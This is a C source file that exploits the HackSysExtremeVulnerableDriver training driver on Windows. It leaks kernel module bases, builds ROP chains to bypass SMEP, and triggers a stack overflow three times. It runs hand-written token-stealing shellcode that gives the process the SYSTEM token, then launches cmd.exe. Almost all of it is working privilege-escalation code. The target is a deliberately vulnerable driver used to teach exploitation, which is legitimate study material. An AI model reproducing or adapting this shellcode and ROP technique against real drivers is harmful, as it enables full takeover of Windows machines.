#include <stdio.h>
#include <Windows.h>
#include <sddl.h>
#include <Psapi.h>
#include <ntstatus.h>
#include "winternl.h"
#include "HEVD.h"

HANDLE driverHandle;
char* lpvPayload;
char* lpvShellcode;

ULONG64 ksecpkg_Addr = 0;
ULONG64 cng_Addr = 0;


HMODULE hKernel = NULL;
ULONG64 KernelBase = NULL;
ULONG64 KUSER_SHARED_DATA = 0xFFFFF78000000000;
ULONG64 pMiGetPteAddress = NULL;
PVOID dummyBuf;
char* dummyArray;
_NtQuerySystemInformation NtQuerySystemInformation;
_MiGetPteAddress MiGetPteAddress;
ULONG64 KiSystemServiceExit_offset = 0x4075c0;
ULONG64 PteBase = NULL;
RTL_PROCESS_MODULES ModuleInfo = { 0 };


ULONG64 BypassSMEP_1[0x10] = {0};
ULONG64 BypassSMEP_2[0x10] = { 0 };



char ShellCode[] =
"\x41\x50\x41\x51\x52\x51\x50"          // push r8, r9, rdx, rcx, rax
"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"	// mov rdx, [gs:188h]		    ; Get _ETHREAD pointer from KPCR
"\x4C\x8B\x82\xB8\x00\x00\x00"		    // mov r8, [rdx + b8h]		    ; _EPROCESS (kd> u PsGetCurrentProcess)
"\x4D\x8B\x88\x48\x04\x00\x00"		    // mov r9, [r8 + 448h]		    ; ActiveProcessLinks list head
"\x49\x8B\x09"				            // mov rcx, [r9]		        ; Follow link to first process in list
//find_system_proc:
"\x48\x8B\x51\xF8"			            // mov rdx, [rcx - 8]		    ; Offset from ActiveProcessLinks to UniqueProcessId
"\x48\x83\xFA\x04"			            // cmp rdx, 4			        ; Process with ID 4 is System process
"\x74\x05"				                // jz found_system		        ; Found SYSTEM token
"\x48\x8B\x09"				            // mov rcx, [rcx]		        ; Follow _LIST_ENTRY Flink pointer
"\xEB\xF1"				                // jmp find_system_proc		    ; Loop
//found_system:
"\x48\x8B\x41\x70"			            // mov rax, [rcx + 70h]		    ; Offset from ActiveProcessLinks to Token
"\x24\xF0"				                // and al, 0f0h			        ; Clear low 4 bits of _EX_FAST_REF structure
"\x49\x89\x80\xB8\x04\x00\x00"		    // mov [r8 + 4b8h], rax		    ; Copy SYSTEM token to current process's token
//recover:
"\x58\x59\x5A\x41\x59\x41\x58"          // push rax, rcx, rdx, r9, r8
"\x48\x31\xF6"				            // xor rsi, rsi			        ; Zeroing out rsi register to avoid Crash
"\x48\x31\xFF"				            // xor rdi, rdi			        ; Zeroing out rdi register to avoid Crash
"\x48\x31\xC0"				            // xor rax, rax			        ; NTSTATUS Status = STATUS_SUCCESS
"\x48\x83\xc4\x28"			            // add rsp, 28h			        ; origin return address at HEVD!BufferOverflowStackIoctlHandler+0x1a
"\xc3"					                // ret				
;

void openDevice() {
    driverHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driverHandle == INVALID_HANDLE_VALUE) {
        printf("\t[-] Could not open HEVD handle\n");
        exit(-1);
    }
}

void getKernelBase() {

    NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        exit(-1);
    }

    // Get the base address of the kernel
    NtQuerySystemInformation(SystemModuleInformation, &ModuleInfo, sizeof(ModuleInfo), NULL);
    KernelBase = (ULONG64)ModuleInfo.Modules[0].ImageBase;
    
}

BOOLEAN GetKernelModuleBase(PCHAR Name, ULONG_PTR* lpBaseAddress) {
    PRTL_PROCESS_MODULES ModuleInformation = NULL;
    ULONG InformationSize = 16;
    NTSTATUS NtStatus;

    NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        exit(-1);
    }

    do {
        InformationSize *= 2;

        ModuleInformation = (PRTL_PROCESS_MODULES)realloc(ModuleInformation, InformationSize);
        memset(ModuleInformation, 0, InformationSize);

        NtStatus = NtQuerySystemInformation(SystemModuleInformation,
            ModuleInformation,
            InformationSize,
            NULL);
    } while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);


    BOOL Success = FALSE;
    for (UINT i = 0; i < ModuleInformation->NumberOfModules; i++) {
        CONST PRTL_PROCESS_MODULE_INFORMATION Module = &ModuleInformation->Modules[i];
        CONST USHORT OffsetToFileName = Module->OffsetToFileName;
        *lpBaseAddress = (ULONG_PTR)ModuleInformation->Modules[i].ImageBase;

        if (!strcmp((const char*)&Module->FullPathName[OffsetToFileName], Name)) {
            Success = TRUE;
            break;
        }
    }

    free(ModuleInformation);
    return Success;
}

void prepareRopBypassSMEP() {
    /*
    --------------------
    -   Stack Layout   -
    --------------------

    /* Use BoF Twice */
    /* 
    pop rcx
    shellcode addr
    nt!MiGetPteAddress addr
    pop rdx                  
    KUSER_SHARED_DATA + 0x800
    mov [rdx], rax           
    */

    /*
    pop rdx
    KUSER_SHARED_DATA + 0x800
    mov rdx, [rdx]
    pop rcx
    0x0FFFFFFFFFFFFFb
    and [rdx], rcx         // ksecpkg + 0x1e635
    */

    
    *(BypassSMEP_1 + 0) = KernelBase + 0x2021a0;
    *(BypassSMEP_1 + 1) = (ULONG64)lpvShellcode;
    *(BypassSMEP_1 + 2) = KernelBase + 0x27af40; //nt!MiGetPteAddress
    *(BypassSMEP_1 + 3) = KernelBase + 0x216c22;
    *(BypassSMEP_1 + 4) = KUSER_SHARED_DATA + 0x800;
    *(BypassSMEP_1 + 5) = KernelBase + 0x2fea59;
    
    *(BypassSMEP_2 + 0) = KernelBase + 0x216c22;
    *(BypassSMEP_2 + 1) = KUSER_SHARED_DATA + 0x800;
    *(BypassSMEP_2 + 2) = KernelBase + 0x3a4037;
    *(BypassSMEP_2 + 3) = KernelBase + 0x2021a0;
    *(BypassSMEP_2 + 4) = 0xFFFFFFFFFFFFFFFB;
    *(BypassSMEP_2 + 5) = ksecpkg_Addr + 0x1e635;


    /* If Forging IoComplete success*/
    /*
    pop rcx;                                        => KernelBase + 0x2021a0
    shellcode addr
    nt!MiGetPteAddress addr
    pop r8;                                         => KernelBase + 2017f1
    KUSER_SHARED_DATA;                              0xFFFFF78000000000
    mov rcx, rax; mov [r8], rcx; xor eax, eax;      => cng_sys + 718ca
    mov rax, [rcx];                                 => KernelBase + 3226e0
    dec eax;                                        => KernelBase + 321db1
    dec eax;                                        => KernelBase + 321db1
    dec eax;                                        => KernelBase + 321db1
    dec eax;                                        => KernelBase + 321db1
    mov [rcx], rax;                                 => KernelBase + 224c91
    */
    
    
    /*
    *(BypassSMEP + 0) = KernelBase + 0x2021a0;
    *(BypassSMEP + 1) = &ShellCode;
    *(BypassSMEP + 2) = KernelBase + 0x27af40; //nt!MiGetPteAddress
    *(BypassSMEP + 3) = KernelBase + 0x2017f1;
    *(BypassSMEP + 4) = KUSER_SHARED_DATA + 0x1000;
    *(BypassSMEP + 5) = cng_Addr + 0x718ca;
    *(BypassSMEP + 6) = KernelBase + 0x3226e0;
    *(BypassSMEP + 7) = KernelBase + 0x321db1;
    *(BypassSMEP + 8) = KernelBase + 0x321db1;
    *(BypassSMEP + 9) = KernelBase + 0x321db1;
    *(BypassSMEP + 10) = KernelBase + 0x321db1;
    */
    
    
    /* Dummy ROP */
    /*
    *(BypassSMEP + 0) = KernelBase + 0x281b3d;
    *(BypassSMEP + 1) = KernelBase + 0x281b3d;
    *(BypassSMEP + 2) = KernelBase + 0x281b3d;
    *(BypassSMEP + 3) = KernelBase + 0x281b3d;
    *(BypassSMEP + 4) = KernelBase + 0x281b3d;
    *(BypassSMEP + 5) = KernelBase + 0x281b3d;
    */

    /*
    *(BypassSMEP + 0) = cng_Addr + 0x982c;
    *(BypassSMEP + 1) = cng_Addr + 0x982c;
    *(BypassSMEP + 2) = cng_Addr + 0x982c;
    *(BypassSMEP + 3) = cng_Addr + 0x982c;
    *(BypassSMEP + 4) = cng_Addr + 0x982c;
    *(BypassSMEP + 5) = cng_Addr + 0x982c;
    */
    


    //printf("0x%llx\n", *BypassSMEP);
    //printf("0x%llx\n", *(BypassSMEP+1));

}

void preparePayload() {
    lpvPayload = (char*)VirtualAlloc(
        NULL,				        // Next page to commit
        0x850,		                // Page size, in bytes
        MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
        PAGE_EXECUTE_READWRITE);	// Read/write access
    if (lpvPayload == NULL) {
        printf("\t[-] Failed to create payload memory\n");
        exit(-1);
    }

    memset(lpvPayload, 0x0, 0x850);
}


void prepareShellcode() {
    lpvShellcode = (char*)VirtualAlloc(
        NULL,				        // Next page to commit
        0x1000,		                // Page size, in bytes
        MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
        PAGE_EXECUTE_READWRITE);	// Read/write access
    if (lpvShellcode == NULL) {
        printf("\t[-] Failed to create shellcode memory\n");
        exit(-1);
    }
    memset(lpvShellcode, 0x0, 0x1000);
    memcpy(lpvShellcode, ShellCode, sizeof(ShellCode));
}


void TriggerStackOverflow(int rop_size) {
    bool ret = DeviceIoControl(driverHandle,       // Device to be queried
        HEVD_IOCTL_BUFFER_OVERFLOW_STACK,          // Operation to perform
        (LPVOID)lpvPayload, 0x818 + rop_size,         // Input Buffer
        NULL, 0,                           // Output Buffer
        NULL, NULL                         // # Bytes returned, Synchronous I/O
    );

}

int main() {

    openDevice();

    // getKernelBase();
    ///printf("[+] KernelBase: 0x%llx\n", KernelBase);
    //printf("[+] ShellCode: 0x%llx\n", &ShellCode);

    // Get the image base addresses of all required images.
    GetKernelModuleBase((PCHAR)"ntoskrnl.exe", &KernelBase);
    GetKernelModuleBase((PCHAR)"cng.sys", &cng_Addr);
    GetKernelModuleBase((PCHAR)"ksecpkg.sys", &ksecpkg_Addr);

    

    printf("[+] ntoskrnl: %llx\n", KernelBase);
    printf("[+] ksecpkg: %llx\n", ksecpkg_Addr);
    printf("[+] cng: %llx\n", cng_Addr);


    
    
    printf("[*] Preparing shellcode & payload\n");
    prepareShellcode();
    preparePayload();
    printf("[+] lpvPayload: 0x%llx\n", lpvPayload);
    printf("[+] lpvShellcode: 0x%llx\n", lpvShellcode);

    printf("[*] Preparing SMEP Bypass ROP Chain\n");
    prepareRopBypassSMEP();
    


    printf("[*] Send 1st payload\n");
    memcpy(lpvPayload + 0x818, BypassSMEP_1, sizeof(BypassSMEP_1));
    TriggerStackOverflow(0x30);
    

    printf("[*] Send 2st payload\n");
    memcpy(lpvPayload + 0x818, BypassSMEP_2, sizeof(BypassSMEP_2));
    TriggerStackOverflow(0x30);
    

    printf("[*] Send 3st payload\n");
    memcpy(lpvPayload + 0x818, &lpvShellcode, 8);
    TriggerStackOverflow(0x8);

    printf("\t[+] Success\n");
    system("cmd.exe");


}